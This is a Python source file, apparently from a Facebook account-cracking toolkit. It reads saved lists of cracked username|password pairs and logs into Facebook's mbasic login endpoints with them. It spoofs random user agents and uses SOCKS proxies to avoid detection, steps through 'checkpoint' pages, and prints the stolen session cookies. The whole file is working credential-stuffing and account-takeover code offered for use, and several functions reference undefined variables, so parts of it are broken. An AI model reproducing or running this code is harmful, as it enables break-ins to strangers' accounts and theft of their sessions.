###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
console = Console()

###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
from src import login as Login
from src import dump as Dump
from src import lain as Lain

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()

###----------[ APPEND AND MORE ]---------- ###
loop = 0
opt = 0
id,id2,ok,cp = [],[],[],[]
datt = []
uasm = []
opt_dev = []
idz = []
apk = []
files = []
id_groups = []
data,data2,data3 = {},{},{}
ugent1, ugent2 = [],[]

for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	bot = f'{A}{B}{C}{D}'
	if bot in uasm:pass
	else:uasm.append(bot)

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

def see_results():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. see results crack account ok
[{color_rich}02{P2}]. see results crack account cp""",width=80,padding=(0,19),style=f"{color_table}"))
	res = input(f" {N}input choice : ")
	if res in["1","01"]:
		dirs = os.listdir("OK")
		prints(Panel(f"""{P2} already found {len(dirs)} file results crack ok""",width=80,padding=(0,15),style=f"{color_table}"))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalok = open(f"OK/{file}","r").read().splitlines()
			datt.append(Panel(f"{P2}[{color_rich}0{num}{P2}]",width=8,style=f"{color_table}"))
			datt.append(Panel(f"{P2}{file}",width=35,title=f"{P2}date result",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{len(totalok)} account",width=30,title=f"{P2}total account",style=f"{color_table}"))
		console.print(Columns(datt))
		prints(Panel(f"""{P2} you only need to choose a number from the file crack above this""",width=80,style=f"{color_table}"))
		bngst = input(f" {N}input choice : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open("OK/%s"%(kontol)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(kontol))
		ask = input(f" {N}show cookies when checking results?[y/n] : ")
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2} date of file results : {del_txt} - total account : {len(totalok)}""",width=80,style=f"{color_table}"))
		if ask in["Y","y"]:
			for z in totalok:
				print(f"{H}{z}")
		else:
			for z in totalok:
				data = z.replace(" * --> ","")
				user,pw = data.split("|")[0],data.split("|")[1]
				print(f"{H}{user}|{pw}")
		prints(Panel(f"""{P2} successully checked files and found {len(totalok)} account in file""",width=80,padding=(0,8),style=f"{color_table}"))
		exit()
	elif res in["2","02"]:
		dirs = os.listdir("CP")
		prints(Panel(f"""{P2} already found {len(dirs)} file results crack cp""",width=80,padding=(0,15),style=f"{color_table}"))
		num = 0
		for file in dirs:
			num += 1
			files.append(file)
			totalcp = open(f"CP/{file}","r").read().splitlines()
			datt.append(Panel(f"{P2}[{color_rich}0{num}{P2}]",width=8,style=f"{color_table}"))
			datt.append(Panel(f"{P2}{file}",width=35,title=f"{P2}date result",style=f"{color_table}"))
			datt.append(Panel(f"{P2}{len(totalcp)} account",width=30,title=f"{P2}total account",style=f"{color_table}"))
		console.print(Columns(datt))
		prints(Panel(f"""{P2} you only need to choose a number from the file crack above this""",width=80,style=f"{color_table}"))
		bngst = input(f" {N}input choice : ")
		try:
			kontol = files[int(bngst)-1]
			totalcp = open("CP/%s"%(kontol)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(kontol))
		nm_file = ("%s"%(kontol)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		prints(Panel(f"""{P2} date of file results : {del_txt} - total account : {len(totalcp)}""",width=80,style=f"{color_table}"))
		print("%s"%(K))
		os.system("cat CP/%s"%(kontol))
		prints(Panel(f"""{P2} successully checked files and found {len(totalcp)} account in file""",width=80,padding=(0,8),style=f"{color_table}"))
		exit()

def check_option():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. check options metode loginphp
[{color_rich}02{P2}]. check options metode reguler
[{color_rich}03{P2}]. check options metode validate""",width=80,padding=(0,18),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1"]:
		prints(Panel(f"""{P2}you choose loginphp. now choose which file checkpoint you want to check""",width=80,style=f"{color_table}"))
		opt_dev.append("loginphp")
		choose_file()
	elif ask in["2"]:
		prints(Panel(f"""{P2}you choose reguler. now choose which file checkpoint you want to check""",width=80,style=f"{color_table}"))
		opt_dev.append("reguler")
		choose_file()
	else:
		prints(Panel(f"""{P2}you choose validate. now choose which file checkpoint you want to check""",width=80,style=f"{color_table}"))
		opt_dev.append("validate")
		choose_file()

def choose_file():
	dirs = os.listdir("CP")
	num = 0
	for file in dirs:
		num += 1
		files.append(file)
		totalcp = open(f"CP/{file}","r").read().splitlines()
		datt.append(Panel(f"{P2}[{color_rich}0{num}{P2}]",width=8,style=f"{color_table}"))
		datt.append(Panel(f"{P2}{file}",width=35,title=f"{P2}date result",style=f"{color_table}"))
		datt.append(Panel(f"{P2}{len(totalcp)} account",width=30,title=f"{P2}total account",style=f"{color_table}"))
	console.print(Columns(datt))
	prints(Panel(f"""{P2} you only need to choose a number from the file crack above this""",width=80,style=f"{color_table}"))
	bngst = input(f" {N}input choice : ")
	try:
		kontol = files[int(bngst)-1]
		totalcp = open(f"CP/{kontol}").read().splitlines()
	except IOError:
		exit(f" [!] file {kontol} tidak tersedia")
	for z in totalcp:
		memek = z.replace("\n","")
		titid  = memek.split("|")
		prints(Panel(f"""{P2}trying to login to the account : {K2}{titid[0].replace("  * --> ","")}|{titid[1]}""",width=80,style=f"{color_table}"))
		if "loginphp" in opt_dev:
			metode_loginphp(titid[0].replace("  * --> ",""),titid[1])
		elif "reguler" in opt_dev:
			metode_loginphp(titid[0].replace("  * --> ",""),titid[1])
		else:
			metode_validate(titid[0].replace("  * --> ",""),titid[1])
	prints(Panel(f"""{P2}berhasil mengecek total {len(totalcp)} akun dan berhasil mendapatkan {H2}{len(ok)}{P2} akun terbuka""",width=80,style=f"{color_table}"))
	exit()
			
def metode_loginphp(user,pw):
	try:
		ua = random.choice(uasm)
		ses.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
		url = parser(ses.get("https://mbasic.facebook.com/login.php").text,"html.parser")
		tamp = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for x in url.find_all("input"):
			if x.get("name") in tamp:
				data.update({x.get("name"):x.get("value")})
			else:continue
		data.update({"email":user,"pass":pw})
		post = ses.post("https://mbasic.facebook.com/login.php",data=data)
		parsing1 = parser(post.text,"html.parser")
		if "c_user" in ses.cookies.get_dict():
			coki = convert(ses.cookies.get_dict())
			print(f" {H}berhasil masuk. akun tidak terkena checkpoint atau sesi")
			print(f" {H}{user}|{pw}|{coki}")
		elif "checkpoint" in ses.cookies.get_dict():
			action1 = parsing1.find("form",{"method":"post"})["action"]
			tamp1 = ["fb_dtsg","jazoest","checkpoint_data","submit[Continue]","nh"]
			for x in parsing1.find_all("input"):
				if x.get("name") in tamp1:
					data2.update({x.get("name"):x.get("value")})
				else:continue
			post2 = ses.post("https://mbasic.facebook.com"+action1, data=data2)
			parsing2 = parser(post2.text,"html.parser")
			option = parsing2.find_all("option")
			if len(option) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(parsing)):
					print(f" {H}berhasil masuk. akun tap yes silahkan login di lite/mbasic")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(parsing3)):
					print(f" {M}gagal login. akun terpasang autentikasi 2 faktor")
				else:
					print("terjadi kesalahan")
			else:
				n=0
				for opsi in option:
					n+=1
					print(f" {N}{n}. {opsi.text}")
		else:
			print(f" {M}Kata sandi yang Anda masukkan salah. Apakah Anda melupakan kata sandi Anda?")
	except Exception as e:
		print(f" {M}Kata sandi yang Anda masukkan salah.Apakah Anda melupakan kata sandi Anda?")
	
def metode_validate(user,pw):
	try:
		ua = random.choice(uasm)
		prox = open("data/proxy.txt","r").read().splitlines()
		proxy= {"http": "socks5://{random.choice(prox)}"}
		headers1 = {
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
			"cache-control": "max-age=0",
			"referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
			"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
			"sec-ch-ua-mobile": "?1",
			"sec-ch-ua-platform": '"Blackberry"',
			"sec-fetch-dest": "document",
			"sec-fetch-mode": "navigate",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": ua
		}
		p = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",headers=headers1)
		data ={
			"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
			"uid":user,
			"next":"https://mbasic.facebook.com/login/save-device/",
			"flow":"login_no_pin",
			"pass": pw
		}
		headers2={
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
			"x-requested-with": "mark.via.gp",
			"cache-control": "max-age=0",
			"content-length": "159",
			"content-type": "application/x-www-form-urlencoded",
			"origin": "https://mbasic.facebook.com",
			"referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
			"sec-fetch-dest": "document",
			"sec-fetch-mode": "navigate",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": ua
		}
		po = ses.post(f"https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=data, headers=headers2, proxies=proxy, allow_redirects=False)
		parsing = parser(post.text,"html.parser")
		if "c_user" in ses.cookies.get_dict():
			coki = convert(ses.cookies.get_dict())
			print(f" {H}berhasil masuk. akun tidak terkena checkpoint atau sesi")
			print(f" {H}{user}|{pw}|{coki}")
		elif "checkpoint" in ses.cookies.get_dict():
			action1 = parsing.find("form",{"method":"post"})["action"]
			tamp1 = ["fb_dtsg","jazoest","checkpoint_data","nh"]
			for x in parsing.find_all("input"):
				if x.get("name") in tamp1:
					data2.update({x.get("name"):x.get("value")})
				else:continue
			post2 = ses.post("https://mbasic.facebook.com"+action1,data=data2)
			parsing2 = parser(post2.text,"html.parser")
			action2 = parsing2.find("form",{"method":"post"})["action"]
			tamp2 = ["fb_dtsg","jazoest","checkpoint_data","submit[Continue]","nh"]
			for x in parsing2.find_all("input"):
				if x.get("name") in tamp2:
					data3.update({x.get("name"):x.get("value")})
				else:continue
			post3 = ses.post("https://mbasic.facebook.com"+action2,data=data3)
			parsing3 = parser(post3.text,"html.parser")
			option = parsing3.find_all("option")
			if len(option) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(parsing)):
					print(f" {H}berhasil masuk. akun tap yes silahkan login di lite/mbasic")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(parsing3)):
					print(f" {M}gagal login. akun terpasang autentikasi 2 faktor")
				else:
					print("terjadi kesalahan")
			else:
				n=0
				for opsi in option:
					n+=1
					print(f" {N}{n}. {opsi.text}")
		else:
			print(f" {M}Kata sandi yang Anda masukkan salah. Apakah Anda melupakan kata sandi Anda?")
	except Exception as e:
		print(f" {M}Kata sandi yang Anda masukkan salah.Apakah Anda melupakan kata sandi Anda?")

def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
def change_theme():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
	them = input(f" {N}choose theme : ")
	if them in["1","01"]:
		open("data/color_rich.txt","w").write("[#FF0000]")
		open("data/color_table.txt","w").write("#FF0000")
	elif them in["2","02"]:
		open("data/color_rich.txt","w").write("[#00FF00]")
		open("data/color_table.txt","w").write("#00FF00")
	elif them in["3","03"]:
		open("data/color_rich.txt","w").write("[#FFFF00]")
		open("data/color_table.txt","w").write("#FFFF00")
	elif them in["4","04"]:
		open("data/color_rich.txt","w").write("[#00C8FF]")
		open("data/color_table.txt","w").write("#00C8FF")
	elif them in["5","05"]:
		open("data/color_rich.txt","w").write("[#AF00FF]")
		open("data/color_table.txt","w").write("#AF00FF")
	elif them in["6","06"]:
		open("data/color_rich.txt","w").write("[#FF00FF]")
		open("data/color_table.txt","w").write("#FF00FF")
	elif them in["7","07"]:
		open("data/color_rich.txt","w").write("[#00FFFF]")
		open("data/color_table.txt","w").write("#00FFFF")
	elif them in["8","08"]:
		open("data/color_rich.txt","w").write("[#FFFFFF]")
		open("data/color_table.txt","w").write("#FFFFFF")
	elif them in["9","09"]:
		open("data/color_rich.txt","w").write("[#FF8F00]")
		open("data/color_table.txt","w").write("#FF8F00")
	elif them in["10"]:
		open("data/color_rich.txt","w").write("[#AAAAAA]")
		open("data/color_table.txt","w").write("#AAAAAA")
	exit()
